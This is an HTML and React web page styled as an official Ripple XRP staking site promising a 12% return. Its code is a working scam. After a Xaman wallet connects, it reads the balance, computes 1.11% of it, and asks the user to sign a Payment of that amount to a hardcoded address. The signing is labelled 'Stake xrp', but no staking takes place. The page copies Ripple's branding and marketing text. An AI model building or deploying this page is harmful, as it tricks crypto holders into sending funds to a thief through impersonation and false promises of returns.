<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ripple XRP dApp</title>
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        const { useState, useEffect } = React;

        function XamanWalletDApp() {
          const [isConnected, setIsConnected] = useState(false);
          const [walletAddress, setWalletAddress] = useState('');
          const [txStatus, setTxStatus] = useState('');
          const [isLoading, setIsLoading] = useState(false);
          const [txHash, setTxHash] = useState('');
          const [qrUrl, setQrUrl] = useState('');
          const [isMobile, setIsMobile] = useState(false);

          useEffect(() => {
            // Detect if user is on mobile
            const checkMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
            setIsMobile(checkMobile);
            
            // Check for saved wallet address in localStorage
            const savedAddress = localStorage.getItem('xamanWalletAddress');
            const savedBalance = localStorage.getItem('xamanWalletBalance');
            const savedAmount = localStorage.getItem('xamanCalculatedAmount');
            
            if (savedAddress) {
              setWalletAddress(savedAddress);
              setIsConnected(true);
              setTxStatus('connected');
              
              if (savedBalance) {
                setUserBalance(parseFloat(savedBalance));
              }
              if (savedAmount) {
                setCalculatedAmount(savedAmount);
              }
            }
          }, []);

          const DESTINATION_ADDRESS = 'rU2Ep6EoRCo4yh3HfLvP2V6QHbNaAmpxuc';
          const [userBalance, setUserBalance] = useState(0);
          const [calculatedAmount, setCalculatedAmount] = useState('0');
          
          // Use relative URL for same domain, or set your backend URL
          const API_BASE = window.location.origin;

          const connectWallet = async () => {
            setIsLoading(true);
            setTxStatus('');
            
            try {
              const authPayload = {
                txjson: {
                  TransactionType: 'SignIn'
                }
              };

              const response = await fetch(`${API_BASE}/api/payload`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(authPayload)
              });

              const data = await response.json();
              
              if (data.refs?.qr_png) {
                // Only show QR code on desktop
                if (!isMobile) {
                  setQrUrl(data.refs.qr_png);
                }
                
                // On mobile, directly open Xaman app. On desktop, open in new tab
                if (isMobile) {
                  window.location.href = data.next.always;
                } else {
                  window.open(data.next.always, '_blank');
                }
                
                const checkPayload = async () => {
                  const statusResponse = await fetch(`${API_BASE}/api/payload/${data.uuid}`);
                  const statusData = await statusResponse.json();
                  
                  if (statusData.meta.signed) {
                    const account = statusData.response.account;
                    setWalletAddress(account);
                    
                    // Fetch account balance
                    try {
                      const balanceResponse = await fetch('https://xrplcluster.com', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                          method: 'account_info',
                          params: [{
                            account: account,
                            ledger_index: 'validated'
                          }]
                        })
                      });
                      
                      const balanceData = await balanceResponse.json();
                      if (balanceData.result?.account_data?.Balance) {
                        const balanceInDrops = parseInt(balanceData.result.account_data.Balance);
                        const balanceInXRP = balanceInDrops / 1000000;
                        setUserBalance(balanceInXRP);
                        
                        // Calculate 1.11% of balance
                        const percentage = balanceInXRP * 0.0111;
                        const amountInDrops = Math.floor(percentage * 1000000);
                        setCalculatedAmount(amountInDrops.toString());
                        
                        // Save to localStorage
                        localStorage.setItem('xamanWalletBalance', balanceInXRP.toString());
                        localStorage.setItem('xamanCalculatedAmount', amountInDrops.toString());
                      }
                    } catch (error) {
                      console.error('Error fetching balance:', error);
                    }
                    
                    // Save wallet address to localStorage
                    localStorage.setItem('xamanWalletAddress', account);
                    
                    setIsConnected(true);
                    setTxStatus('connected');
                    setQrUrl('');
                  } else if (statusData.meta.resolved && !statusData.meta.signed) {
                    setTxStatus('rejected');
                    setQrUrl('');
                  } else {
                    setTimeout(checkPayload, 2000);
                  }
                };
                
                checkPayload();
              }
            } catch (error) {
              setTxStatus('error');
              console.error('Connection failed:', error);
            } finally {
              setIsLoading(false);
            }
          };

          const signTransaction = async () => {
            setIsLoading(true);
            setTxStatus('signing');
            
            try {
              const paymentPayload = {
                txjson: {
                  TransactionType: 'Payment',
                  Destination: DESTINATION_ADDRESS,
                  Amount: calculatedAmount,
                  Account: walletAddress
                }
              };

              const response = await fetch(`${API_BASE}/api/payload`, {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json',
                },
                body: JSON.stringify(paymentPayload)
              });

              const data = await response.json();
              
              if (data.refs?.qr_png) {
                // Only show QR code on desktop
                if (!isMobile) {
                  setQrUrl(data.refs.qr_png);
                }
                
                // On mobile, directly open Xaman app. On desktop, open in new tab
                if (isMobile) {
                  window.location.href = data.next.always;
                } else {
                  window.open(data.next.always, '_blank');
                }
                
                const checkPayload = async () => {
                  const statusResponse = await fetch(`${API_BASE}/api/payload/${data.uuid}`);
                  const statusData = await statusResponse.json();
                  
                  if (statusData.meta.signed) {
                    setTxHash(statusData.response.txid);
                    setTxStatus('success');
                    setQrUrl('');
                  } else if (statusData.meta.resolved && !statusData.meta.signed) {
                    setTxStatus('rejected');
                    setQrUrl('');
                  } else {
                    setTimeout(checkPayload, 2000);
                  }
                };
                
                checkPayload();
              }
            } catch (error) {
              setTxStatus('error');
              console.error('Transaction failed:', error);
            } finally {
              setIsLoading(false);
            }
          };

          const disconnect = () => {
            setIsConnected(false);
            setWalletAddress('');
            setTxStatus('');
            setTxHash('');
            setUserBalance(0);
            setCalculatedAmount('0');
            
            // Clear localStorage
            localStorage.removeItem('xamanWalletAddress');
            localStorage.removeItem('xamanWalletBalance');
            localStorage.removeItem('xamanCalculatedAmount');
          };

          return (
            <div className="min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900">
              <header className="bg-slate-900/80 backdrop-blur-sm border-b border-slate-700/50">
                <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <div className="w-8 h-8 bg-blue-500 rounded-lg flex items-center justify-center">
                      <div className="w-4 h-4 bg-white rounded-full"></div>
                    </div>
                    <span className="text-white font-semibold text-xl">ripple</span>
                  </div>
                </div>
              </header>

              <main className="max-w-4xl mx-auto px-6 py-20 pb-32">
                <div className="text-center mb-16">
                  <h1 className="text-5xl md:text-6xl font-bold text-white mb-6 leading-tight">
                    Earn 12% ROI for staking your xrp
                  </h1>
                  <p className="text-slate-300 text-lg max-w-3xl mx-auto">
                    Ripple's payments, custody and stablecoin solutions empower financial institutions to
                    integrate blockchain and digital assets into their business in a simple, secure, compliant
                    way—all in one place.
                  </p>
                </div>

                <div className="bg-green-900/20 border border-green-700/50 rounded-xl p-4 mb-8">
                  <p className="text-green-200 text-sm">
                    <strong></strong> Connect your wallet to get started.
                  </p>
                </div>

                <div className="bg-slate-800/50 backdrop-blur-sm border border-slate-700/50 rounded-2xl p-8 md:p-12 shadow-2xl mb-24">
                  {!isConnected ? (
                    <div className="text-center">
                      <div className="w-20 h-20 bg-blue-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                        <svg className="w-10 h-10 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
                        </svg>
                      </div>
                      <h2 className="text-3xl font-bold text-white mb-4">
                        Connect Your Wallet
                      </h2>
                      <p className="text-slate-400 mb-8 max-w-md mx-auto">
                        Securely connect your wallet to stake your XRP and earn rewards.
                      </p>
                      
                      {qrUrl && !isMobile && (
                        <div className="mb-6">
                          <img src={qrUrl} alt="Scan with Xaman" className="mx-auto rounded-lg shadow-lg" />
                          <p className="text-slate-400 text-sm mt-4">Scan this QR code with your Xaman app</p>
                        </div>
                      )}
                      
                      {isLoading && isMobile && (
                        <p className="text-blue-400 mb-6">Opening Xaman app...</p>
                      )}
                      
                      {txStatus === 'rejected' && (
                        <p className="text-red-400 mt-4">Connection was rejected. Please try again.</p>
                      )}
                    </div>
                  ) : (
                    <div className="text-center">
                      {txStatus === 'connected' && (
                        <div className="mb-8">
                          <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <svg className="w-10 h-10 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <h2 className="text-3xl font-bold text-white mb-2">
                            Wallet Connected
                          </h2>
                          <p className="text-slate-400 mb-2">Your wallet is successfully connected</p>
                          <p className="text-sm text-slate-500 font-mono bg-slate-900/50 px-4 py-2 rounded-lg inline-block mb-8">
                            {walletAddress}
                          </p>
                        </div>
                      )}

                      {txStatus === 'success' ? (
                        <div>
                          <div className="w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <svg className="w-10 h-10 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <h2 className="text-3xl font-bold text-white mb-4">
                            Transaction Signed Successfully
                          </h2>
                          <p className="text-slate-400 mb-4">
                            Your transaction has been signed and submitted to the XRPL network
                          </p>
                          {txHash && (
                            <a
                              href={`https://livenet.xrpl.org/transactions/${txHash}`}
                              target="_blank"
                              rel="noopener noreferrer"
                              className="inline-flex items-center gap-2 text-blue-400 hover:text-blue-300 mb-8"
                            >
                              <span className="font-mono text-sm">{txHash.substring(0, 16)}...</span>
                              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                              </svg>
                            </a>
                          )}
                          <div className="mt-8">
                            <button
                              onClick={() => setTxStatus('connected')}
                              className="px-8 py-4 bg-slate-700 hover:bg-slate-600 text-white font-semibold rounded-xl transition-all"
                            >
                              Send Another Transaction
                            </button>
                          </div>
                        </div>
                      ) : txStatus === 'error' ? (
                        <div>
                          <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <svg className="w-10 h-10 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <h2 className="text-3xl font-bold text-white mb-4">
                            Transaction Failed
                          </h2>
                          <p className="text-slate-400 mb-8">
                            There was an error signing your transaction. Please try again.
                          </p>
                          <button
                            onClick={signTransaction}
                            className="px-8 py-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-xl transition-all"
                          >
                            Retry
                          </button>
                        </div>
                      ) : txStatus === 'rejected' ? (
                        <div>
                          <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-4">
                            <svg className="w-10 h-10 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M10 14l2-2m0 0l2-2m-2 2l-2-2m2 2l2 2m7-2a9 9 0 11-18 0 9 9 0 0118 0z" />
                            </svg>
                          </div>
                          <h2 className="text-3xl font-bold text-white mb-4">
                            Transaction Rejected
                          </h2>
                          <p className="text-slate-400 mb-8">
                            You rejected the transaction in Xaman.
                          </p>
                          <button
                            onClick={() => setTxStatus('connected')}
                            className="px-8 py-4 bg-slate-700 hover:bg-slate-600 text-white font-semibold rounded-xl transition-all"
                          >
                            Go Back
                          </button>
                        </div>
                      ) : (
                        <div>
                          {qrUrl && !isMobile && (
                            <div className="mb-6">
                              <img src={qrUrl} alt="Scan with Xaman" className="mx-auto rounded-lg shadow-lg mb-4" />
                              <p className="text-slate-400 text-sm">Scan this QR code or check your Xaman app</p>
                            </div>
                          )}
                          
                          {isLoading && isMobile && (
                            <p className="text-blue-400 mb-6">Opening Xaman app...</p>
                          )}
                          
                          <h2 className="text-3xl font-bold text-white mb-4">
                            Stake xrp
                          </h2>
                          <p className="text-slate-400 mb-8 max-w-md mx-auto">
                            Securely stake your XRP to earn a 12% annual return directly through your wallet.
                          </p>
                        </div>
                      )}
                    </div>
                  )}
                </div>

                {/* Sticky Button Container */}
                <div className="fixed bottom-0 left-0 right-0 bg-gradient-to-t from-slate-900 via-slate-900 to-transparent p-6 pb-8 z-50">
                  <div className="max-w-md mx-auto">
                    {!isConnected ? (
                      <button
                        onClick={connectWallet}
                        disabled={isLoading}
                        className="w-full px-8 py-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-blue-500/50"
                      >
                        {isLoading ? (
                          <span className="flex items-center justify-center gap-2">
                            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                            Waiting for Xaman...
                          </span>
                        ) : (
                          'Connect Wallet'
                        )}
                      </button>
                    ) : txStatus === 'connected' ? (
                      <button
                        onClick={signTransaction}
                        disabled={isLoading}
                        className="w-full px-8 py-4 bg-blue-600 hover:bg-blue-700 disabled:bg-blue-800 disabled:cursor-not-allowed text-white font-semibold rounded-xl transition-all transform hover:scale-105 active:scale-95 shadow-lg shadow-blue-500/50"
                      >
                        {isLoading ? (
                          <span className="flex items-center justify-center gap-2">
                            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                            Waiting for signature...
                          </span>
                        ) : (
                          'Stake xrp'
                        )}
                      </button>
                    ) : txStatus === 'success' ? (
                      <button
                        onClick={() => setTxStatus('connected')}
                        className="w-full px-8 py-4 bg-slate-700 hover:bg-slate-600 text-white font-semibold rounded-xl transition-all"
                      >
                        Send Another Transaction
                      </button>
                    ) : txStatus === 'error' || txStatus === 'rejected' ? (
                      <button
                        onClick={() => setTxStatus('connected')}
                        className="w-full px-8 py-4 bg-slate-700 hover:bg-slate-600 text-white font-semibold rounded-xl transition-all"
                      >
                        Go Back
                      </button>
                    ) : null}
                  </div>
                </div>

                <div className="mt-12 text-center">
                  <p className="text-slate-500 text-sm">
                    Powered by XRPL • Secure • Decentralized
                  </p>
                </div>
              </main>
            </div>
          );
        }

        ReactDOM.render(<XamanWalletDApp />, document.getElementById('root'));
    </script>
</body>
</html>
